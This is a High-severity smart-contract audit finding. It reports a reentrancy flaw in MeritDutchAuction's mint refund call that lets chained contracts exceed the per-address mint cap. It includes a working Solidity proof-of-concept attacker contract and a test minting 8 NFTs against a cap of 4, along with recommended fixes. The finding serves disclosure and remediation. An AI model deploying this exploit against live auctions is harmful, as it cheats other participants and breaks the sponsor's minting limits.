# [H] Reentrancy in MeritDutchAuction#mint can result in a single EOA being able to mint much more than cap per address in one transaction

## Summary
Severity: High
Reporter: devblixt
Source: https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L163
Type: audit-issue

## Details
# Reentrancy in MeritDutchAuction#mint can result in a single EOA being able to mint much more than cap per address in one transaction

## Summary

A reentrancy vulnerability in mint() function of the MeritDutchAuction contract will enable a user to mint more than maximum cap intended per address in a single transaction. 

## Vulnerability Detail

The contract applies a max cap per address check for minting, which will prevent a single address from minting too many NFTs. Even though a single user can mint more than cap through multiple addresses in multiple transactions, this does not present a user with an unfair advantage. However, if a single user can mint more than the number of NFTs allowed in a single transaction, it can be classified as unfair behavior. The sponsor has also confirmed that it is not something that is intended to happen. 

The mint function of contract, after conducting the ERC721 NFT mint refunds the leftover amount by this method:

```solidity
(bool success, ) = payable(msg.sender).call{value: msg.value - totalPaid}(bytes(""));
```
If the msg.sender is an EOA, the refund is simply transferred into the account. However, if it is a contract, the fallback() function is called, and the contract can call another contract through the fallback function which in turn calls the mint function of the auction contract. This can be done in a chained method with each contract calling another to do the mint, so the resultant NFTs minted in a single transaction by a single EOA is much more than intended. 

## Impact

A malicious user can deploy several contracts and mint much more than the permitted cap per user in a single transaction. This will be unintended behavior according to the contract and unfair to the users. 

## Code Snippet

The issue is in [MeritDutchAuction.sol#L163: ](https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L163)

```solidity
(bool success, ) = payable(msg.sender).call{value: msg.value - totalPaid}(bytes(""));
```

Here is a bare minimum smart contract which a malicious user can deploy. It has not been made ERC721 compatible:

```solidity
//SPDX-License-Identifier: MIT
import "../../src/MeritDutchAuction.sol";

pragma solidity ^0.8.18;

contract Extern {
    uint256 constant START_PRICE = 1e18;
    uint256 constant public CAP = 4;
    address nextChain;
    bool isChained;
    MeritDutchAuction auction;
    constructor(address _auction) {
        auction = MeritDutchAuction(_auction);
    }

    function setChain(address _nextChain) public {
        nextChain = _nextChain;
    }

    function setChained(bool _isChained) public {
        isChained = _isChained;
    }

    fallback() payable external {
        uint256 current = START_PRICE * CAP;
        if(msg.value > current) {
        auction.mint{value: current}(CAP);
        }
        if(isChained && (msg.value - current > current)) {
            (bool check, ) = nextChain.call{value: msg.value - current}(bytes(""));
        
        }
    }
}
```
This test can be added to already existing test cases in MeritDutchAuction.t.sol to test this contract: 

```solidity

    function testReentrancy() public {
        uint256 CAP = 4;
        Extern first = new Extern(address(auction));
        Extern second = new Extern(address(auction));
        first.setChain(address(second));
        first.setChained(true);
        address wallet = vm.addr(uint256(keccak256(abi.encodePacked(uint256(1), "kekekekek"))));
        vm.deal(wallet, 1000000000e18);
        vm.warp(startTime);
        (bool success, )  = address(first).call{value: START_PRICE*CAP*4}(bytes(""));
        console.log(auction.minted());
    }

```

On executing the given unit test, we can see that we're able to mint 8 NFTs, which is more than the cap of 4 in a single transaction. 

## Tool used

Manual Review

## Recommendation

There are a few methods that can be implemented to prevent this: 

1. Have a nonReentrant modifier for the mint function
2. Apply mint cap for tx.origin instead of msg.sender
